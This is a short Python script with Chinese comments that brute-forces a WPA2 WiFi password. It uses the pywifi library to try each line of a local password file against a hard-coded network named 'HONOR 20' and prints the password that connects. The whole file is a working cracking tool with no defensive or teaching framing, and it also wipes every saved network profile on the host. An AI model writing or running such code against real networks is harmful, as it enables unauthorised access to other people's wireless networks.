'''
Created on 2020年5月10日

@author: 船长
'''
import pywifi
from pywifi import const
import time

'''
1.导入模块
2.抓取第一个网卡接口
3.断开WiFi连接
4.从密码本读取，不断去试
5.设置睡眠时间        3秒左右
'''
# 名称   密码
def wificonnect(wifiName,wifiPassword):
    '''测试WiFi连接'''
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()             #断开WiFi连接
    time.sleep(0.5)                 #等0.5秒，防止WiFi未断开连接
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()  #创建WiFi连接文件
        profile.ssid = wifiName     #WiFi名称
        profile.key = wifiPassword  #WiFi密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)              #WiFi加密算法
        profile.auth = const.AUTH_ALG_OPEN                      #网卡的开放
        profile.cipher = const.CIPHER_TYPE_CCMP                 #加密单元
        ifaces.remove_all_network_profiles()                    #删除所有的WiFi文件
        tep_profile = ifaces.add_network_profile(profile)       #设定新的连接文件
        ifaces.connect(tep_profile)                             #连接WiFi
        time.sleep(4)                                           #设置睡眠时间，防止程序速度过快导致WiFi无法连接成功就跳过
        if ifaces.status() == const.IFACE_CONNECTED:            #判断WiFi连接状态
            return True
        else:
            return False

'''
读取密码本传密码
'''
def readPwd():
    print("开始破解密码···")
    path = "D:/AWorkSpace/PythonWorkSpace/PythonStudy/src/nieqiang/password.txt"
    file = open(path,"r")
    while True:
        try:
            wifiName = "HONOR 20"
            wifiPwd = file.readline()
            bool = wificonnect(wifiName, wifiPwd)
            if bool:
                print(wifiName+"密码正确："+wifiPwd)
                break           #只能退出一层循环
            else:
                print(wifiName+"密码错误："+wifiPwd)
        except:
            continue
        
    file.close()
    
readPwd()